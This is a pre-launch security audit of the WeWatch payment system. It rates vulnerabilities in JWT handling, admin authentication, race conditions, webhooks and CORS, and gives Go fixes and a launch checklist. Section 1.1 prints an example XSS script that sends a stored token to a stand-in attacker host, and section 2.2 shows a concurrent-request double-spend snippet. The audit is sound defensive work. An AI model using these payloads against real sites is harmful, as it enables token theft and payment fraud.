# Payment System Security Analysis & Recommendations

**Date:** April 25, 2026  
**Analyst:** Chibuzor  
**Scope:** WeWatch Payment System Security Assessment  
**Status:** PRE-LAUNCH SECURITY AUDIT

---

## Executive Summary

This document analyzes the security posture of the WeWatch payment system, identifies vulnerabilities, and provides actionable recommendations for hardening before public launch.

### Current Security Status: ⚠️ **MODERATE RISK**

**Critical Findings:**
- ✅ **GOOD**: JWT authentication, bcrypt passwords, rate limiting on auth
- ⚠️ **GAPS**: No 2FA, payment tampering possible, webhook validation weak
- ❌ **CRITICAL**: Admin endpoints lack additional verification
- ❌ **HIGH**: No IP whitelisting for admin actions

---

## 1. Authentication & Authorization Vulnerabilities

### 1.1 JWT Token Security

**Current Implementation:**
- HS256 signing algorithm
- 24-hour token expiry
- 64-character secret key
- Tokens stored in localStorage

**Vulnerabilities:**

#### 🔴 **CRITICAL: No Token Blacklist on Logout**
**Risk:** Stolen tokens remain valid for 24 hours even after logout

**Attack Scenario:**
```
1. Attacker steals JWT token (XSS, man-in-the-middle)
2. User logs out thinking they're safe
3. Attacker continues using stolen token for 24 hours
4. Can make payments, withdraw funds, change settings
```

**Impact:** Account takeover, unauthorized transactions

**Recommendation:**
```go
// backend/internal/models/token_blacklist.go
type TokenBlacklist struct {
    ID        uint      `gorm:"primaryKey"`
    Token     string    `gorm:"uniqueIndex;not null"`
    ExpiresAt time.Time `gorm:"index;not null"`
    CreatedAt time.Time
}

// Check on every authenticated request
func IsTokenBlacklisted(token string) bool {
    var blacklisted TokenBlacklist
    err := DB.Where("token = ? AND expires_at > ?", token, time.Now()).First(&blacklisted).Error
    return err == nil
}
```

**Priority:** 🔴 P0 (Implement before launch)

---

#### 🟡 **MEDIUM: Token Stored in localStorage (XSS Risk)**
**Risk:** Vulnerable to XSS attacks

**Current Code:**
```javascript
// frontend/src/services/api.js
localStorage.setItem('token', token);
```

**Attack Scenario:**
```html
<!-- Attacker injects malicious script -->
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token')
  });
</script>
```

**Recommendation:**
- **Option 1 (Best):** Use httpOnly cookies (requires backend change)
  ```go
  c.SetCookie("token", token, 86400, "/", domain, true, true)
  // httpOnly=true, secure=true
  ```
  
- **Option 2 (Quick):** Add Content Security Policy (CSP)
  ```go
  // backend/cmd/server/main.go
  c.Header("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'")
  ```

**Priority:** 🟡 P1 (Post-launch Week 1)

---

### 1.2 Admin Authentication Gaps

#### 🔴 **CRITICAL: No 2FA for Super Admin**
**Risk:** Single point of failure for platform control

**Current Code:**
```go
// Only checks password, no second factor
if bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(req.Password)) != nil {
    return errors.New("invalid credentials")
}
```

**Attack Scenario:**
```
1. Attacker brute forces admin password (or phishes it)
2. Gains access to admin dashboard
3. Can:
   - Approve fraudulent payouts
   - Access platform accounting data
   - Manipulate user wallets
   - Delete audit logs
```

**Impact:** Financial loss, data breach, platform shutdown

**Recommendation:**
```go
// Add TOTP (Time-based One-Time Password) for admin logins

// backend/internal/models/user.go
type User struct {
    // ... existing fields
    TwoFactorSecret   *string    `gorm:"type:varchar(255)" json:"-"`
    TwoFactorEnabled  bool       `gorm:"default:false" json:"two_factor_enabled"`
    BackupCodes       []string   `gorm:"type:jsonb" json:"-"` // 10 backup codes
}

// backend/internal/handlers/auth_handlers.go
func LoginHandler(c *gin.Context) {
    // ... existing password check
    
    if user.Role == "admin" || user.Role == "super_admin" {
        if !user.TwoFactorEnabled {
            // Force 2FA setup on first admin login
            return c.JSON(200, gin.H{"require_2fa_setup": true})
        }
        
        // Require TOTP code
        if req.TOTPCode == "" {
            return c.JSON(400, gin.H{"error": "2FA code required"})
        }
        
        if !verifyTOTP(user.TwoFactorSecret, req.TOTPCode) {
            // Log failed 2FA attempt
            auditLog("2FA_FAILED", user.ID, c.ClientIP())
            return c.JSON(401, gin.H{"error": "Invalid 2FA code"})
        }
    }
    
    // ... continue with token generation
}
```

**Libraries:**
- Backend: `github.com/pquerna/otp/totp`
- Frontend: `otplib` (npm package)

**Priority:** 🔴 P0 (Implement BEFORE launch for super admin)

---

#### 🟠 **HIGH: No IP Whitelisting for Admin Actions**
**Risk:** Admin can access from any location

**Recommendation:**
```go
// Allow admin access only from trusted IPs
var AdminAllowedIPs = []string{
    "YOUR_HOME_IP",
    "YOUR_OFFICE_IP",
    "VPN_GATEWAY_IP",
}

func RequireAdminIP() gin.HandlerFunc {
    return func(c *gin.Context) {
        clientIP := c.ClientIP()
        
        allowed := false
        for _, ip := range AdminAllowedIPs {
            if clientIP == ip {
                allowed = true
                break
            }
        }
        
        if !allowed {
            auditLog("ADMIN_ACCESS_DENIED_IP", 0, clientIP)
            c.JSON(403, gin.H{"error": "Access denied from this location"})
            c.Abort()
            return
        }
        
        c.Next()
    }
}

// Apply to admin routes
adminGroup.Use(RequireAdminIP())
```

**Priority:** 🟠 P1 (Add after launch, Week 1)

---

## 2. Payment Tampering Vulnerabilities

### 2.1 Client-Side Amount Manipulation

#### 🔴 **CRITICAL: Amount Validation Only on Backend**
**Risk:** Attacker can modify payment amounts in transit

**Current Code:**
```javascript
// frontend - User sees ₦1,000 but can send ₦10
const purchaseTicket = async (sessionId) => {
    await api.post(`/sessions/${sessionId}/tickets/purchase`, {
        payment_method: 'tokens',
        // Attacker modifies this in browser DevTools
        amount_tokens: 10 // Should be 1000!
    });
};
```

**Backend Validation (GOOD):**
```go
// backend/internal/handlers/ticket_handlers.go
// ✅ Backend fetches actual price from database
ticketPriceTokens := session.TicketPriceTokens // From DB, not client
```

**Status:** ✅ **ALREADY PROTECTED** (backend enforces price)

**Additional Recommendation:**
Add checksum validation to prevent replay attacks:
```go
// Generate payment token with HMAC
paymentToken := generatePaymentToken(sessionID, amount, timestamp, secret)

// Client sends: {amount, timestamp, token}
// Backend verifies token matches before processing
if !verifyPaymentToken(req.Amount, req.Timestamp, req.Token) {
    return errors.New("Invalid payment token")
}
```

**Priority:** 🟡 P2 (Enhancement, not urgent)

---

### 2.2 Race Condition: Double Spending

#### 🟠 **HIGH: Concurrent Ticket Purchases**
**Risk:** User can purchase same ticket multiple times before balance check

**Attack Scenario:**
```javascript
// Send 10 requests simultaneously
Promise.all([
    purchaseTicket(sessionId),
    purchaseTicket(sessionId),
    purchaseTicket(sessionId),
    // ... 10 times
]);

// If wallet has 1000 tokens and ticket costs 1000,
// attacker gets 10 tickets before balance check updates
```

**Current Code:**
```go
// backend/internal/handlers/ticket_handlers.go
// ⚠️ NO DATABASE LOCK!
if err := buyerWallet.DeductTokens(ticketPriceTokens); err != nil {
    return err // Too late if concurrent requests
}
```

**Recommendation:**
```go
// Use database transactions with row locking
tx := db.Begin()
defer func() {
    if r := recover(); r != nil {
        tx.Rollback()
    }
}()

// Lock wallet row for update
var buyerWallet models.UserWallet
if err := tx.Set("gorm:query_option", "FOR UPDATE").Where("user_id = ?", buyerID).First(&buyerWallet).Error; err != nil {
    tx.Rollback()
    return err
}

// Now balance is locked, safe to deduct
if err := buyerWallet.DeductTokens(amount); err != nil {
    tx.Rollback()
    return err
}

tx.Commit()
```

**Priority:** 🟠 P0 (Implement before launch)

---

### 2.3 Webhook Signature Verification

#### 🟠 **HIGH: Paystack Webhook Validation Weak**
**Risk:** Attacker can fake payment confirmations

**Current Code:**
```go
// backend/internal/handlers/webhook_handlers.go
// ✅ GOOD: Signature verification exists
signature := c.GetHeader("X-Paystack-Signature")
if !verifyPaystackSignature(body, signature, secret) {
    return c.JSON(401, gin.H{"error": "Invalid signature"})
}
```

**Additional Recommendations:**
1. **Idempotency Check** (prevent replay attacks)
   ```go
   type ProcessedWebhook struct {
       ID          uint   `gorm:"primaryKey"`
       EventID     string `gorm:"uniqueIndex;not null"` // Paystack event ID
       ProcessedAt time.Time
   }
   
   // Before processing
   if webhookAlreadyProcessed(eventID) {
       return c.JSON(200, gin.H{"message": "Already processed"})
   }
   ```

2. **Amount Double-Check** (verify with Paystack API)
   ```go
   // After webhook, query Paystack to confirm amount
   paystackAmount := queryPaystackTransaction(reference)
   if paystackAmount != expectedAmount {
       auditLog("WEBHOOK_AMOUNT_MISMATCH", userID, reference)
       return errors.New("Amount mismatch")
   }
   ```

**Priority:** 🟠 P1 (Week 1 post-launch)

---

## 3. Database Security

### 3.1 SQL Injection Protection

**Status:** ✅ **PROTECTED** (GORM uses prepared statements)

**Example:**
```go
// ✅ SAFE: GORM parameterizes automatically
db.Where("user_id = ?", userID).First(&wallet)

// ❌ UNSAFE (not used in codebase):
// db.Raw("SELECT * FROM wallets WHERE user_id = " + userID)
```

**Recommendation:** Keep using GORM, avoid raw SQL queries.

---

### 3.2 Sensitive Data Encryption

#### 🟡 **MEDIUM: Payment Account Details in Plaintext**
**Risk:** Database breach exposes bank account numbers

**Current Schema:**
```sql
CREATE TABLE payment_accounts (
    account_number VARCHAR(50), -- ❌ Plaintext
    bank_code VARCHAR(10),      -- ❌ Plaintext
    account_name VARCHAR(255)   -- ❌ Plaintext
);
```

**Recommendation:**
```go
// Encrypt before storing
import "golang.org/x/crypto/nacl/secretbox"

func encryptAccountNumber(plaintext string) string {
    encrypted := secretbox.Seal(nil, []byte(plaintext), nonce, key)
    return base64.StdEncoding.EncodeToString(encrypted)
}

// Decrypt when needed for payouts
func decryptAccountNumber(encrypted string) string {
    decoded, _ := base64.StdEncoding.DecodeString(encrypted)
    decrypted, _ := secretbox.Open(nil, decoded, nonce, key)
    return string(decrypted)
}
```

**Priority:** 🟡 P2 (Post-launch Month 2)

---

## 4. Rate Limiting & DDoS Protection

### 4.1 Payment Endpoint Rate Limiting

#### 🟠 **HIGH: No Rate Limit on Payment Endpoints**
**Risk:** Attackers can spam payment requests

**Current Code:**
```go
// ✅ Auth endpoints have rate limiting (5 req/min)
r.POST("/api/auth/login", authLimiter, handlers.LoginHandler)

// ❌ Payment endpoints have no limits
r.POST("/api/tokens/purchase", handlers.PurchaseTokensHandler)
r.POST("/api/sessions/:id/tickets/purchase", handlers.PurchaseTicketHandler)
```

**Recommendation:**
```go
// Add rate limiter for payment endpoints
paymentLimiter := handlers.NewRateLimiter(10, time.Minute) // 10 req/min

paymentGroup := r.Group("/api")
paymentGroup.Use(handlers.AuthMiddleware())
paymentGroup.Use(paymentLimiter) // Apply to all payment routes
{
    paymentGroup.POST("/tokens/purchase", handlers.PurchaseTokensHandler)
    paymentGroup.POST("/sessions/:id/tickets/purchase", handlers.PurchaseTicketHandler)
    paymentGroup.POST("/sessions/:id/donate", handlers.DonateToSessionHandler)
    paymentGroup.POST("/donations/gift", handlers.GiftTokensHandler)
    paymentGroup.POST("/payouts/request", handlers.RequestPayoutHandler)
}
```

**Priority:** 🟠 P0 (Implement before launch)

---

### 4.2 Payout Request Spam

#### 🟡 **MEDIUM: Users Can Spam Payout Requests**
**Risk:** Database bloat, admin overwhelm

**Recommendation:**
```go
// Limit payout requests to 3 per day per user
func checkPayoutRequestLimit(userID uint) error {
    var count int64
    db.Model(&models.Payout{}).
        Where("user_id = ? AND created_at > ?", userID, time.Now().Add(-24*time.Hour)).
        Count(&count)
    
    if count >= 3 {
        return errors.New("Maximum 3 payout requests per day")
    }
    return nil
}
```

**Priority:** 🟡 P1 (Week 1 post-launch)

---

## 5. Audit Logging & Monitoring

### 5.1 Missing Security Events

#### 🟡 **MEDIUM: Insufficient Audit Logging**
**Current Logs:**
- ✅ Admin actions (payouts, KYC approvals)
- ❌ Failed login attempts
- ❌ 2FA failures
- ❌ IP changes for admins
- ❌ Large transactions (>₦10,000)

**Recommendation:**
```go
// Expand audit logging
type AuditLog struct {
    ID          uint      `gorm:"primaryKey"`
    Event       string    `gorm:"index;not null"` // LOGIN_FAILED, LARGE_PAYOUT, IP_CHANGE
    UserID      *uint     `gorm:"index"`
    IPAddress   string    `gorm:"index"`
    UserAgent   string
    Metadata    string    `gorm:"type:jsonb"` // Additional context
    CreatedAt   time.Time `gorm:"index"`
}

// Log security events
func auditLog(event string, userID uint, ipAddress string, metadata map[string]interface{}) {
    metadataJSON, _ := json.Marshal(metadata)
    log := AuditLog{
        Event:     event,
        UserID:    &userID,
        IPAddress: ipAddress,
        Metadata:  string(metadataJSON),
    }
    DB.Create(&log)
}

// Monitor for suspicious patterns
go monitorSuspiciousActivity() // Background goroutine
```

**Events to Log:**
- `LOGIN_FAILED` - Track brute force attempts
- `ADMIN_LOGIN` - All admin logins
- `LARGE_TRANSACTION` - Transactions > ₦50,000
- `PAYOUT_REJECTED` - Rejected payouts for fraud detection
- `IP_CHANGE_ADMIN` - Admin logs in from new IP
- `TOKEN_BLACKLIST` - Token invalidated
- `2FA_FAILED` - Failed 2FA attempts

**Priority:** 🟡 P1 (Week 1 post-launch)

---

## 6. Frontend Security

### 6.1 Environment Variable Exposure

#### 🟡 **MEDIUM: API Keys in Frontend Code**
**Risk:** Paystack public key exposed

**Current:**
```javascript
// frontend/.env
VITE_PAYSTACK_PUBLIC_KEY=pk_test_xxxxx // Public key (OK to expose)
```

**Status:** ✅ **SAFE** (public key is meant to be public)

**But be careful:**
- ❌ Never put secret keys in frontend
- ❌ Never commit `.env` files
- ✅ Use `VITE_` prefix for exposed variables

---

### 6.2 CORS Configuration

#### 🟡 **MEDIUM: Permissive CORS**
**Current:**
```go
// backend/cmd/server/main.go
AllowOriginFunc: func(origin string) bool {
    // Allows localhost, Vercel, Cloudflare
    return strings.HasPrefix(origin, "http://localhost:") ||
           strings.Contains(origin, ".vercel.app") ||
           strings.Contains(origin, ".trycloudflare.com")
}
```

**Recommendation:**
```go
// Whitelist specific domains in production
var AllowedOrigins = []string{
    "https://letswatchout.com",
    "https://www.letswatchout.com",
    "https://letswatchout-staging.vercel.app", // Staging only
}

AllowOriginFunc: func(origin string) bool {
    // Development mode
    if os.Getenv("ENVIRONMENT") == "development" {
        return strings.HasPrefix(origin, "http://localhost:")
    }
    
    // Production mode (strict whitelist)
    for _, allowed := range AllowedOrigins {
        if origin == allowed {
            return true
        }
    }
    return false
}
```

**Priority:** 🟡 P1 (Before production deployment)

---

## 7. Security Checklist (Before Launch)

### Critical (Must Fix Before Launch)
- [ ] Implement JWT token blacklist on logout
- [ ] Add database row locking for concurrent transactions
- [ ] Add rate limiting to payment endpoints (10 req/min)
- [ ] Implement 2FA for super admin (TOTP)
- [ ] Add idempotency check for Paystack webhooks
- [ ] Whitelist production CORS origins

### High Priority (Week 1 Post-Launch)
- [ ] IP whitelisting for admin dashboard
- [ ] Expand audit logging (failed logins, 2FA, large transactions)
- [ ] Payout request daily limit (3 per day)
- [ ] Payment amount double-check with Paystack API
- [ ] Add suspicious activity monitoring alerts

### Medium Priority (Month 1-2)
- [ ] Move JWT to httpOnly cookies
- [ ] Encrypt bank account numbers in database
- [ ] Add Content Security Policy (CSP) headers
- [ ] Implement session fingerprinting
- [ ] Add honeypot fields in payment forms

### Low Priority (Month 3+)
- [ ] Penetration testing (hire security firm)
- [ ] Bug bounty program
- [ ] SIEM integration (Splunk, ELK Stack)
- [ ] DDoS protection (Cloudflare Enterprise)

---

## 8. Implementation Priority Matrix

| Vulnerability | Severity | Ease of Fix | Priority | Timeline |
|---------------|----------|-------------|----------|----------|
| No 2FA for Admin | Critical | Medium | P0 | Before Launch |
| JWT Token Blacklist | Critical | Easy | P0 | Before Launch |
| Race Condition (Double Spend) | High | Medium | P0 | Before Launch |
| Payment Rate Limiting | High | Easy | P0 | Before Launch |
| Webhook Idempotency | High | Easy | P1 | Week 1 |
| IP Whitelisting | High | Easy | P1 | Week 1 |
| Audit Logging | Medium | Easy | P1 | Week 1 |
| CORS Whitelist | Medium | Easy | P1 | Week 1 |
| HttpOnly Cookies | Medium | Hard | P2 | Month 1 |
| Encrypt Bank Accounts | Medium | Medium | P2 | Month 2 |

---

## 9. Estimated Implementation Time

**Pre-Launch (Critical Items):** 2-3 days
- 2FA for Admin: 6 hours
- Token Blacklist: 3 hours
- Row Locking: 2 hours
- Rate Limiting: 2 hours
- Webhook Idempotency: 2 hours
- Testing: 4 hours

**Week 1 Post-Launch (High Priority):** 1-2 days
- IP Whitelisting: 2 hours
- Audit Logging Expansion: 3 hours
- CORS Whitelist: 1 hour
- Testing: 2 hours

**Total Dev Time:** 4-5 days before production-ready

---

## 10. Monitoring & Alerting

### Set Up Alerts For:
1. **Failed Admin Logins** - 3+ failed attempts in 5 minutes
2. **Large Payouts** - Any payout > ₦100,000
3. **Suspicious Wallet Activity** - 10+ transactions in 1 minute
4. **Webhook Failures** - 5+ failed webhooks
5. **Database Connection Errors** - Any DB errors
6. **Server CPU/Memory** - > 80% usage

### Tools:
- **Application:** Sentry (error tracking)
- **Infrastructure:** Uptime Robot (uptime monitoring)
- **Logs:** Logtail (log aggregation)
- **Alerts:** Email + SMS via Twilio

**Cost:** ~$50/month (free tiers available)

---

## Conclusion

**Current Risk Level:** ⚠️ **MODERATE** (not production-ready)

**After Implementing P0 Items:** ✅ **LOW RISK** (production-ready)

**Estimated Dev Time:** 4-5 days

**Recommendation:** Do NOT launch without implementing the 6 critical (P0) security measures. The platform handles real money, and security breaches will destroy user trust and potentially lead to financial loss.

**Sign-Off:**
- **Security Analyst:** Chibuzor
- **Developer:** Chibuzor
- **Product Owner:** Chibuzor
- **Date:** April 25, 2026

---

**Next Steps:**
1. Create GitHub Issues for each P0 item
2. Implement 2FA for super admin (highest priority)
3. Add token blacklist and row locking
4. Test all security measures
5. Document security procedures in `.clinerules`
6. Schedule post-launch security audit (Week 2)
